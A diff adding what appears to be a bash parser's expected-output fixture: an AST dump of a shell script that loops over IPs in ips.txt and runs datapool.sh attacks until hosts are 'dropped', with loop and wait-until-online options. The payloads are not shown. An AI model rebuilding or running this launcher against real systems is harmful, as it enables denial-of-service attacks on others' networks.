@@ -1,0 +1,488 @@
+CompoundNode(lineno=5, list=[
+  IfNode(lineno=5, pos=(12, 133), parts=[
+    ReservedwordNode(lineno=2, pos=(12, 14), word='if'),
+    ListNode(lineno=2, pos=(15, 34), parts=[
+        CommandNode(lineno=2, pos=(15, 33), parts=[
+          WordNode(lineno=2, pos=(15, 16), word='['),
+          WordNode(lineno=2, pos=(17, 18), word='!'),
+          WordNode(lineno=2, pos=(19, 21), word='-f'),
+          WordNode(lineno=2, pos=(22, 31), word='./ips.txt'),
+          WordNode(lineno=2, pos=(32, 33), word=']'),
+        ]),
+        OperatorNode(lineno=2, op=';', pos=(33, 34)),
+      ]),
+    ReservedwordNode(lineno=2, pos=(35, 39), word='then'),
+    ListNode(lineno=5, pos=(44, 131), parts=[
+        CommandNode(lineno=3, pos=(44, 119), parts=[
+          WordNode(lineno=3, pos=(44, 48), word='echo'),
+          WordNode(lineno=3, pos=(49, 119), word='Please create ./ips.txt with a list of IPs to attack before running.'),
+        ]),
+        OperatorNode(lineno=4, op='\n', pos=(119, 120)),
+        CommandNode(lineno=4, pos=(124, 130), parts=[
+          WordNode(lineno=4, pos=(124, 128), word='exit'),
+          WordNode(lineno=4, pos=(129, 130), word='1'),
+        ]),
+        OperatorNode(lineno=5, op='\n', pos=(130, 131)),
+      ]),
+    ReservedwordNode(lineno=5, pos=(131, 133), word='fi'),
+  ]),
+], pos=(12, 133))
+CompoundNode(lineno=9, list=[
+  IfNode(lineno=9, pos=(134, 254), parts=[
+    ReservedwordNode(lineno=6, pos=(134, 136), word='if'),
+    ListNode(lineno=6, pos=(137, 160), parts=[
+        CommandNode(lineno=6, pos=(137, 159), parts=[
+          WordNode(lineno=6, pos=(137, 138), word='['),
+          WordNode(lineno=6, pos=(139, 140), word='!'),
+          WordNode(lineno=6, pos=(141, 143), word='-f'),
+          WordNode(lineno=6, pos=(144, 157), word='./datapool.fc'),
+          WordNode(lineno=6, pos=(158, 159), word=']'),
+        ]),
+        OperatorNode(lineno=6, op=';', pos=(159, 160)),
+      ]),
+    ReservedwordNode(lineno=6, pos=(161, 165), word='then'),
+    ListNode(lineno=9, pos=(170, 252), parts=[
+        CommandNode(lineno=7, pos=(170, 240), parts=[
+          WordNode(lineno=7, pos=(170, 174), word='echo'),
+          WordNode(lineno=7, pos=(175, 240), word="Dude, wtf were u thinking?? Don't delete datapool.fc dumbass!!!"),
+        ]),
+        OperatorNode(lineno=8, op='\n', pos=(240, 241)),
+        CommandNode(lineno=8, pos=(245, 251), parts=[
+          WordNode(lineno=8, pos=(245, 249), word='exit'),
+          WordNode(lineno=8, pos=(250, 251), word='1'),
+        ]),
+        OperatorNode(lineno=9, op='\n', pos=(251, 252)),
+      ]),
+    ReservedwordNode(lineno=9, pos=(252, 254), word='fi'),
+  ]),
+], pos=(134, 254))
+CommandNode(lineno=10, pos=(255, 270), parts=[
+  WordNode(lineno=10, pos=(255, 256), word='.'),
+  WordNode(lineno=10, pos=(257, 270), word='./datapool.fc'),
+])
+FunctionNode(lineno=29, pos=(272, 1179), parts=[
+  ReservedwordNode(lineno=12, pos=(272, 280), word='function'),
+  WordNode(lineno=12, pos=(281, 287), word='usage2'),
+  CompoundNode(lineno=29, list=[
+    ReservedwordNode(lineno=12, pos=(288, 289), word='{'),
+    ListNode(lineno=29, pos=(294, 1178), parts=[
+        CommandNode(lineno=13, pos=(294, 367), parts=[
+          WordNode(lineno=13, pos=(294, 298), word='echo'),
+          WordNode(lineno=13, pos=(299, 367), word='Usage: $0 [-i] [source ip] [-v] [logfile] [-p] [portlow-porthigh] ', parts=[
+            ParameterNode(lineno=13, pos=(307, 309), value='0'),
+          ]),
+        ]),
+        OperatorNode(lineno=14, op='\n', pos=(367, 368)),
+        CommandNode(lineno=14, pos=(372, 449), parts=[
+          WordNode(lineno=14, pos=(372, 376), word='echo'),
+          WordNode(lineno=14, pos=(377, 449), word='[-s] [-l] [T1|T3|OC3|Modem|Slowass] [-x] [-k] [-a] [-t] [# of attacks]'),
+        ]),
+        OperatorNode(lineno=15, op='\n', pos=(449, 450)),
+        CommandNode(lineno=15, pos=(454, 478), parts=[
+          WordNode(lineno=15, pos=(454, 458), word='echo'),
+          WordNode(lineno=15, pos=(459, 478), word='[-r] [attackname]'),
+        ]),
+        OperatorNode(lineno=16, op='\n', pos=(478, 479)),
+        CommandNode(lineno=16, pos=(483, 498), parts=[
+          WordNode(lineno=16, pos=(483, 487), word='echo'),
+          WordNode(lineno=16, pos=(488, 498), word='Options:'),
+        ]),
+        OperatorNode(lineno=17, op='\n', pos=(498, 499)),
+        CommandNode(lineno=17, pos=(503, 560), parts=[
+          WordNode(lineno=17, pos=(503, 507), word='echo'),
+          WordNode(lineno=17, pos=(508, 560), word='[-p]: Specifies port range to scan.  ex: -p 1-1024'),
+        ]),
+        OperatorNode(lineno=18, op='\n', pos=(560, 561)),
+        CommandNode(lineno=18, pos=(565, 607), parts=[
+          WordNode(lineno=18, pos=(565, 569), word='echo'),
+          WordNode(lineno=18, pos=(570, 607), word='[-x]: "Don\'t stop till they drop"'),
+        ]),
+        OperatorNode(lineno=19, op='\n', pos=(607, 608)),
+        CommandNode(lineno=19, pos=(612, 674), parts=[
+          WordNode(lineno=19, pos=(612, 616), word='echo'),
+          WordNode(lineno=19, pos=(617, 674), word='[-v]: Logs results of scan to file.  ex: -v logfile.log'),
+        ]),
+        OperatorNode(lineno=20, op='\n', pos=(674, 675)),
+        CommandNode(lineno=20, pos=(679, 708), parts=[
+          WordNode(lineno=20, pos=(679, 683), word='echo'),
+          WordNode(lineno=20, pos=(684, 708), word='[-s]: Scan ports only.'),
+        ]),
+        OperatorNode(lineno=21, op='\n', pos=(708, 709)),
+        CommandNode(lineno=21, pos=(713, 778), parts=[
+          WordNode(lineno=21, pos=(713, 717), word='echo'),
+          WordNode(lineno=21, pos=(718, 778), word='[-l]: Specifies line speed.  Choose from T1,T3, and Modem.'),
+        ]),
+        OperatorNode(lineno=22, op='\n', pos=(778, 779)),
+        CommandNode(lineno=22, pos=(783, 834), parts=[
+          WordNode(lineno=22, pos=(783, 787), word='echo'),
+          WordNode(lineno=22, pos=(788, 834), word='[-i]: Specifies source IP.  ex: -i 127.0.0.1'),
+        ]),
+        OperatorNode(lineno=23, op='\n', pos=(834, 835)),
+        CommandNode(lineno=23, pos=(839, 890), parts=[
+          WordNode(lineno=23, pos=(839, 843), word='echo'),
+          WordNode(lineno=23, pos=(844, 890), word='[-k]: Wait till host is online, then attack.'),
+        ]),
+        OperatorNode(lineno=24, op='\n', pos=(890, 891)),
+        CommandNode(lineno=24, pos=(895, 973), parts=[
+          WordNode(lineno=24, pos=(895, 899), word='echo'),
+          WordNode(lineno=24, pos=(900, 973), word='[-a]: Loop attack. (Used with -k and -x can keep a connection dropped.)'),
+        ]),
+        OperatorNode(lineno=25, op='\n', pos=(973, 974)),
+        CommandNode(lineno=25, pos=(978, 1041), parts=[
+          WordNode(lineno=25, pos=(978, 982), word='echo'),
+          WordNode(lineno=25, pos=(983, 1041), word='[-t]: Number of simultaneous attacks to launch. ex: -t 4'),
+        ]),
+        OperatorNode(lineno=26, op='\n', pos=(1041, 1042)),
+        CommandNode(lineno=26, pos=(1046, 1103), parts=[
+          WordNode(lineno=26, pos=(1046, 1050), word='echo'),
+          WordNode(lineno=26, pos=(1051, 1103), word='[-r]: Run this attack only. ex: -r onetwothreefour'),
+        ]),
+        OperatorNode(lineno=27, op='\n', pos=(1103, 1104)),
+        CommandNode(lineno=27, pos=(1108, 1166), parts=[
+          WordNode(lineno=27, pos=(1108, 1112), word='echo'),
+          WordNode(lineno=27, pos=(1113, 1166), word='      Note: attacknames can be found in datapool.fc'),
+        ]),
+        OperatorNode(lineno=28, op='\n', pos=(1166, 1167)),
+        CommandNode(lineno=28, pos=(1171, 1177), parts=[
+          WordNode(lineno=28, pos=(1171, 1175), word='exit'),
+          WordNode(lineno=28, pos=(1176, 1177), word='1'),
+        ]),
+        OperatorNode(lineno=29, op='\n', pos=(1177, 1178)),
+      ]),
+    ReservedwordNode(lineno=29, pos=(1178, 1179), word='}'),
+  ], pos=(288, 1179)),
+])
+CommandNode(lineno=30, pos=(1180, 1189), parts=[
+  AssignmentNode(lineno=30, pos=(1180, 1189), word='LOOPATK=0'),
+])
+CompoundNode(lineno=36, list=[
+  WhileNode(lineno=36, pos=(1190, 1300), parts=[
+    ReservedwordNode(lineno=31, pos=(1190, 1195), word='while'),
+    ListNode(lineno=31, pos=(1196, 1225), parts=[
+        CommandNode(lineno=31, pos=(1196, 1223), parts=[
+          WordNode(lineno=31, pos=(1196, 1203), word='getopts'),
+          WordNode(lineno=31, pos=(1204, 1216), word='p:v:l:i:xask'),
+          WordNode(lineno=31, pos=(1217, 1223), word='OPTION'),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(1224, 1225)),
+      ]),
+    ReservedwordNode(lineno=31, pos=(1226, 1228), word='do'),
+    CompoundNode(lineno=35, list=[
+      CaseNode(lineno=35, pos=(1233, 1295), parts=[
+        ReservedwordNode(lineno=32, pos=(1233, 1237), word='case'),
+        WordNode(lineno=32, pos=(1238, 1247), word='$OPTION', parts=[
+          ParameterNode(lineno=32, pos=(1239, 1246), value='OPTION'),
+        ]),
+        ReservedwordNode(lineno=32, pos=(1248, 1250), word='in'),
+        PatternNode(actions=[
+          CommandNode(lineno=33, pos=(1258, 1267), parts=[
+            AssignmentNode(lineno=33, pos=(1258, 1267), word='LOOPATK=1'),
+          ]),
+        ], lineno=33, pattern=[
+          WordNode(lineno=33, pos=(1255, 1256), word='a'),
+        ], pos=(1255, 1267)),
+        PatternNode(actions=[
+          CommandNode(lineno=34, pos=(1278, 1284), parts=[
+            WordNode(lineno=34, pos=(1278, 1284), word='usage2'),
+          ]),
+        ], lineno=34, pattern=[
+          WordNode(lineno=34, pos=(1274, 1276), word='?'),
+        ], pos=(1274, 1284)),
+        ReservedwordNode(lineno=35, pos=(1291, 1295), word='esac'),
+      ]),
+    ], pos=(1233, 1295)),
+    ReservedwordNode(lineno=36, pos=(1296, 1300), word='done'),
+  ]),
+], pos=(1190, 1300))
+CommandNode(lineno=37, pos=(1301, 1306), parts=[
+  WordNode(lineno=37, pos=(1301, 1306), word='clear'),
+])
+CommandNode(lineno=39, pos=(1308, 1311), parts=[
+  WordNode(lineno=39, pos=(1308, 1311), word='nfo'),
+])
+CommandNode(lineno=41, pos=(1313, 1416), parts=[
+  WordNode(lineno=41, pos=(1313, 1317), word='trap'),
+  WordNode(lineno=41, pos=(1318, 1407), word='rm -f ./output.txt ; rm -f ./output2.txt ; rm -rf ./svcname.txt ; ./cleaner.sh ; exit 1'),
+  WordNode(lineno=41, pos=(1408, 1409), word='1'),
+  WordNode(lineno=41, pos=(1410, 1411), word='2'),
+  WordNode(lineno=41, pos=(1412, 1413), word='3'),
+  WordNode(lineno=41, pos=(1414, 1416), word='15'),
+])
+CompoundNode(lineno=74, list=[
+  IfNode(lineno=74, pos=(1417, 2553), parts=[
+    ReservedwordNode(lineno=42, pos=(1417, 1419), word='if'),
+    ListNode(lineno=42, pos=(1420, 1441), parts=[
+        CommandNode(lineno=42, pos=(1420, 1440), parts=[
+          WordNode(lineno=42, pos=(1420, 1421), word='['),
+          WordNode(lineno=42, pos=(1422, 1432), word='$LOOPATK', parts=[
+            ParameterNode(lineno=42, pos=(1423, 1431), value='LOOPATK'),
+          ]),
+          WordNode(lineno=42, pos=(1433, 1434), word='='),
+          WordNode(lineno=42, pos=(1435, 1438), word='0'),
+          WordNode(lineno=42, pos=(1439, 1440), word=']'),
+        ]),
+        OperatorNode(lineno=42, op=';', pos=(1440, 1441)),
+      ]),
+    ReservedwordNode(lineno=42, pos=(1442, 1446), word='then'),
+    ListNode(lineno=57, pos=(1451, 1967), parts=[
+        CommandNode(lineno=43, pos=(1451, 1477), parts=[
+          WordNode(lineno=43, pos=(1451, 1455), word='echo'),
+          WordNode(lineno=43, pos=(1456, 1477), word='Beginning attack...'),
+        ]),
+        OperatorNode(lineno=44, op='\n', pos=(1477, 1478)),
+        CompoundNode(lineno=55, list=[
+          WhileNode(lineno=55, pos=(1482, 1923), parts=[
+            ReservedwordNode(lineno=44, pos=(1482, 1487), word='while'),
+            CommandNode(lineno=44, pos=(1488, 1501), parts=[
+              WordNode(lineno=44, pos=(1488, 1492), word='read'),
+              WordNode(lineno=44, pos=(1493, 1501), word='ATTACKIP'),
+            ]),
+            ReservedwordNode(lineno=45, pos=(1506, 1508), word='do'),
+            ListNode(lineno=55, pos=(1510, 1915), parts=[
+                CommandNode(lineno=46, pos=(1510, 1539), parts=[
+                  WordNode(lineno=46, pos=(1510, 1514), word='echo'),
+                  WordNode(lineno=46, pos=(1515, 1539), word='Attacking $ATTACKIP...', parts=[
+                    ParameterNode(lineno=46, pos=(1526, 1535), value='ATTACKIP'),
+                  ]),
+                ]),
+                OperatorNode(lineno=47, op='\n', pos=(1539, 1540)),
+                CommandNode(lineno=47, pos=(1541, 1594), parts=[
+                  WordNode(lineno=47, pos=(1541, 1554), word='./datapool.sh'),
+                  WordNode(lineno=47, pos=(1555, 1557), word='$@', parts=[
+                    ParameterNode(lineno=47, pos=(1555, 1557), value='@'),
+                  ]),
+                  WordNode(lineno=47, pos=(1558, 1560), word='-d'),
+                  WordNode(lineno=47, pos=(1561, 1570), word='$ATTACKIP', parts=[
+                    ParameterNode(lineno=47, pos=(1561, 1570), value='ATTACKIP'),
+                  ]),
+                  RedirectNode(input=1, lineno=47, output=
+                    WordNode(lineno=47, pos=(1573, 1582), word='/dev/null'), pos=(1571, 1582), type='>'),
+                  RedirectNode(input=2, lineno=47, output=
+                    WordNode(lineno=47, pos=(1585, 1594), word='/dev/null'), pos=(1583, 1594), type='>'),
+                ]),
+                OperatorNode(lineno=48, op='\n', pos=(1594, 1595)),
+                CompoundNode(lineno=54, list=[
+                  CaseNode(lineno=54, pos=(1596, 1914), parts=[
+                    ReservedwordNode(lineno=48, pos=(1596, 1600), word='case'),
+                    WordNode(lineno=48, pos=(1601, 1603), word='$?', parts=[
+                      ParameterNode(lineno=48, pos=(1601, 1603), value='?'),
+                    ]),
+                    ReservedwordNode(lineno=48, pos=(1604, 1606), word='in'),
+                    PatternNode(actions=[
+                      CommandNode(lineno=49, pos=(1611, 1654), parts=[
+                        WordNode(lineno=49, pos=(1611, 1615), word='echo'),
+                        WordNode(lineno=49, pos=(1616, 1654), word='$ATTACKIP was dropped by $LASTATTACK', parts=[
+                          ParameterNode(lineno=49, pos=(1617, 1626), value='ATTACKIP'),
+                          ParameterNode(lineno=49, pos=(1642, 1653), value='LASTATTACK'),
+                        ]),
+                      ]),
+                    ], lineno=49, pattern=[
+                      WordNode(lineno=49, pos=(1608, 1609), word='0'),
+                    ], pos=(1608, 1654)),
+                    PatternNode(actions=[
+                      CommandNode(lineno=50, pos=(1662, 1717), parts=[
+                        WordNode(lineno=50, pos=(1662, 1666), word='echo'),
+                        WordNode(lineno=50, pos=(1667, 1717), word='There was an error running the script...exiting.'),
+                      ]),
+                      OperatorNode(lineno=50, op=';', pos=(1718, 1719)),
+                      CommandNode(lineno=50, pos=(1720, 1726), parts=[
+                        WordNode(lineno=50, pos=(1720, 1724), word='exit'),
+                        WordNode(lineno=50, pos=(1725, 1726), word='1'),
+                      ]),
+                    ], lineno=50, pattern=[
+                      WordNode(lineno=50, pos=(1659, 1660), word='1'),
+                    ], pos=(1659, 1726)),
+                    PatternNode(actions=[
+                      CommandNode(lineno=51, pos=(1734, 1769), parts=[
+                        WordNode(lineno=51, pos=(1734, 1738), word='echo'),
+                        WordNode(lineno=51, pos=(1739, 1769), word='$ATTACKIP was not avaliable.', parts=[
+                          ParameterNode(lineno=51, pos=(1740, 1749), value='ATTACKIP'),
+                        ]),
+                      ]),
+                    ], lineno=51, pattern=[
+                      WordNode(lineno=51, pos=(1731, 1732), word='2'),
+                    ], pos=(1731, 1769)),
+                    PatternNode(actions=[
+                      CommandNode(lineno=52, pos=(1777, 1826), parts=[
+                        WordNode(lineno=52, pos=(1777, 1781), word='echo'),
+                        WordNode(lineno=52, pos=(1782, 1826), word='The following ports are open on $ATTACKIP:', parts=[
+                          ParameterNode(lineno=52, pos=(1815, 1824), value='ATTACKIP'),
+                        ]),
+                      ]),
+                      OperatorNode(lineno=52, op=';', pos=(1827, 1828)),
+                      CommandNode(lineno=52, pos=(1829, 1845), parts=[
+                        WordNode(lineno=52, pos=(1829, 1832), word='cat'),
+                        WordNode(lineno=52, pos=(1833, 1845), word='./output.txt'),
+                      ]),
+                    ], lineno=52, pattern=[
+                      WordNode(lineno=52, pos=(1774, 1775), word='4'),
+                    ], pos=(1774, 1845)),
+                    PatternNode(actions=[
+                      CommandNode(lineno=53, pos=(1853, 1905), parts=[
+                        WordNode(lineno=53, pos=(1853, 1857), word='echo'),
+                        WordNode(lineno=53, pos=(1858, 1905), word='$ATTACKIP was attacked, but is still alive...', parts=[
+                          ParameterNode(lineno=53, pos=(1859, 1868), value='ATTACKIP'),
+                        ]),
+                      ]),
+                    ], lineno=53, pattern=[
+                      WordNode(lineno=53, pos=(1850, 1851), word='5'),
+                    ], pos=(1850, 1905)),
+                    ReservedwordNode(lineno=54, pos=(1910, 1914), word='esac'),
+                  ]),
+                ], pos=(1596, 1914)),
+                OperatorNode(lineno=55, op='\n', pos=(1914, 1915)),
+              ]),
+            ReservedwordNode(lineno=55, pos=(1919, 1923), word='done'),
+          ]),
+        ], pos=(1482, 1937), redirects=[
+          RedirectNode(lineno=55, output=
+            WordNode(lineno=55, pos=(1926, 1937), word='./ips.txt'), pos=(1924, 1937), type='<'),
+        ]),
+        OperatorNode(lineno=56, op='\n', pos=(1937, 1938)),
+        CommandNode(lineno=56, pos=(1942, 1966), parts=[
+          WordNode(lineno=56, pos=(1942, 1946), word='echo'),
+          WordNode(lineno=56, pos=(1947, 1966), word='Attack completed.'),
+        ]),
+        OperatorNode(lineno=57, op='\n', pos=(1966, 1967)),
+      ]),
+    ReservedwordNode(lineno=57, pos=(1967, 1971), word='else'),
+    ListNode(lineno=74, pos=(1976, 2551), parts=[
+        CommandNode(lineno=58, pos=(1976, 2002), parts=[
+          WordNode(lineno=58, pos=(1976, 1980), word='echo'),
+          WordNode(lineno=58, pos=(1981, 2002), word='Beginning attack...'),
+        ]),
+        OperatorNode(lineno=59, op='\n', pos=(2002, 2003)),
+        CompoundNode(lineno=72, list=[
+          WhileNode(lineno=72, pos=(2007, 2521), parts=[
+            ReservedwordNode(lineno=59, pos=(2007, 2012), word='while'),
+            ListNode(lineno=59, pos=(2013, 2018), parts=[
+                CommandNode(lineno=59, pos=(2013, 2017), parts=[
+                  WordNode(lineno=59, pos=(2013, 2017), word='true'),
+                ]),
+                OperatorNode(lineno=59, op=';', pos=(2017, 2018)),
+              ]),
+            ReservedwordNode(lineno=59, pos=(2019, 2021), word='do'),
+            CompoundNode(lineno=71, list=[
+              WhileNode(lineno=71, pos=(2023, 2498), parts=[
+                ReservedwordNode(lineno=60, pos=(2023, 2028), word='while'),
+                CommandNode(lineno=60, pos=(2029, 2042), parts=[
+                  WordNode(lineno=60, pos=(2029, 2033), word='read'),
+                  WordNode(lineno=60, pos=(2034, 2042), word='ATTACKIP'),
+                ]),
+                ReservedwordNode(lineno=61, pos=(2044, 2046), word='do'),
+                ListNode(lineno=71, pos=(2052, 2493), parts=[
+                    CommandNode(lineno=62, pos=(2052, 2081), parts=[
+                      WordNode(lineno=62, pos=(2052, 2056), word='echo'),
+                      WordNode(lineno=62, pos=(2057, 2081), word='Attacking $ATTACKIP...', parts=[
+                        ParameterNode(lineno=62, pos=(2068, 2077), value='ATTACKIP'),
+                      ]),
+                    ]),
+                    OperatorNode(lineno=63, op='\n', pos=(2081, 2082)),
+                    CommandNode(lineno=63, pos=(2087, 2140), parts=[
+                      WordNode(lineno=63, pos=(2087, 2100), word='./datapool.sh'),
+                      WordNode(lineno=63, pos=(2101, 2103), word='$@', parts=[
+                        ParameterNode(lineno=63, pos=(2101, 2103), value='@'),
+                      ]),
+                      WordNode(lineno=63, pos=(2104, 2106), word='-d'),
+                      WordNode(lineno=63, pos=(2107, 2116), word='$ATTACKIP', parts=[
+                        ParameterNode(lineno=63, pos=(2107, 2116), value='ATTACKIP'),
+                      ]),
+                      RedirectNode(input=1, lineno=63, output=
+                        WordNode(lineno=63, pos=(2119, 2128), word='/dev/null'), pos=(2117, 2128), type='>'),
+                      RedirectNode(input=2, lineno=63, output=
+                        WordNode(lineno=63, pos=(2131, 2140), word='/dev/null'), pos=(2129, 2140), type='>'),
+                    ]),
+                    OperatorNode(lineno=64, op='\n', pos=(2140, 2141)),
+                    CompoundNode(lineno=70, list=[
+                      CaseNode(lineno=70, pos=(2146, 2492), parts=[
+                        ReservedwordNode(lineno=64, pos=(2146, 2150), word='case'),
+                        WordNode(lineno=64, pos=(2151, 2153), word='$?', parts=[
+                          ParameterNode(lineno=64, pos=(2151, 2153), value='?'),
+                        ]),
+                        ReservedwordNode(lineno=64, pos=(2154, 2156), word='in'),
+                        PatternNode(actions=[
+                          CommandNode(lineno=65, pos=(2165, 2208), parts=[
+                            WordNode(lineno=65, pos=(2165, 2169), word='echo'),
+                            WordNode(lineno=65, pos=(2170, 2208), word='$ATTACKIP was dropped by $LASTATTACK', parts=[
+                              ParameterNode(lineno=65, pos=(2171, 2180), value='ATTACKIP'),
+                              ParameterNode(lineno=65, pos=(2196, 2207), value='LASTATTACK'),
+                            ]),
+                          ]),
+                        ], lineno=65, pattern=[
+                          WordNode(lineno=65, pos=(2162, 2163), word='0'),
+                        ], pos=(2162, 2208)),
+                        PatternNode(actions=[
+                          CommandNode(lineno=66, pos=(2224, 2279), parts=[
+                            WordNode(lineno=66, pos=(2224, 2228), word='echo'),
+                            WordNode(lineno=66, pos=(2229, 2279), word='There was an error running the script...exiting.'),
+                          ]),
+                          OperatorNode(lineno=66, op=';', pos=(2280, 2281)),
+                          CommandNode(lineno=66, pos=(2282, 2288), parts=[
+                            WordNode(lineno=66, pos=(2282, 2286), word='exit'),
+                            WordNode(lineno=66, pos=(2287, 2288), word='1'),
+                          ]),
+                        ], lineno=66, pattern=[
+                          WordNode(lineno=66, pos=(2221, 2222), word='1'),
+                        ], pos=(2221, 2288)),
+                        PatternNode(actions=[
+                          CommandNode(lineno=67, pos=(2300, 2335), parts=[
+                            WordNode(lineno=67, pos=(2300, 2304), word='echo'),
+                            WordNode(lineno=67, pos=(2305, 2335), word='$ATTACKIP was not avaliable.', parts=[
+                              ParameterNode(lineno=67, pos=(2306, 2315), value='ATTACKIP'),
+                            ]),
+                          ]),
+                        ], lineno=67, pattern=[
+                          WordNode(lineno=67, pos=(2297, 2298), word='2'),
+                        ], pos=(2297, 2335)),
+                        PatternNode(actions=[
+                          CommandNode(lineno=68, pos=(2347, 2396), parts=[
+                            WordNode(lineno=68, pos=(2347, 2351), word='echo'),
+                            WordNode(lineno=68, pos=(2352, 2396), word='The following ports are open on $ATTACKIP:', parts=[
+                              ParameterNode(lineno=68, pos=(2385, 2394), value='ATTACKIP'),
+                            ]),
+                          ]),
+                          OperatorNode(lineno=68, op=';', pos=(2397, 2398)),
+                          CommandNode(lineno=68, pos=(2399, 2415), parts=[
+                            WordNode(lineno=68, pos=(2399, 2402), word='cat'),
+                            WordNode(lineno=68, pos=(2403, 2415), word='./output.txt'),
+                          ]),
+                        ], lineno=68, pattern=[
+                          WordNode(lineno=68, pos=(2344, 2345), word='4'),
+                        ], pos=(2344, 2415)),
+                        PatternNode(actions=[
+                          CommandNode(lineno=69, pos=(2427, 2479), parts=[
+                            WordNode(lineno=69, pos=(2427, 2431), word='echo'),
+                            WordNode(lineno=69, pos=(2432, 2479), word='$ATTACKIP was attacked, but is still alive...', parts=[
+                              ParameterNode(lineno=69, pos=(2433, 2442), value='ATTACKIP'),
+                            ]),
+                          ]),
+                        ], lineno=69, pattern=[
+                          WordNode(lineno=69, pos=(2424, 2425), word='5'),
+                        ], pos=(2424, 2479)),
+                        ReservedwordNode(lineno=70, pos=(2488, 2492), word='esac'),
+                      ]),
+                    ], pos=(2146, 2492)),
+                    OperatorNode(lineno=71, op='\n', pos=(2492, 2493)),
+                  ]),
+                ReservedwordNode(lineno=71, pos=(2494, 2498), word='done'),
+              ]),
+            ], pos=(2023, 2512), redirects=[
+              RedirectNode(lineno=71, output=
+                WordNode(lineno=71, pos=(2501, 2512), word='./ips.txt'), pos=(2499, 2512), type='<'),
+            ]),
+            ReservedwordNode(lineno=72, pos=(2517, 2521), word='done'),
+          ]),
+        ], pos=(2007, 2521)),
+        OperatorNode(lineno=73, op='\n', pos=(2521, 2522)),
+        CommandNode(lineno=73, pos=(2526, 2550), parts=[
+          WordNode(lineno=73, pos=(2526, 2530), word='echo'),
+          WordNode(lineno=73, pos=(2531, 2550), word='Attack completed.'),
+        ]),
+        OperatorNode(lineno=74, op='\n', pos=(2550, 2551)),
+      ]),
+    ReservedwordNode(lineno=74, pos=(2551, 2553), word='fi'),
+  ]),
+], pos=(1417, 2553))
+CommandNode(lineno=75, pos=(2554, 2555), parts=[
+  WordNode(lineno=75, pos=(2554, 2555), word='\x00'),
+])
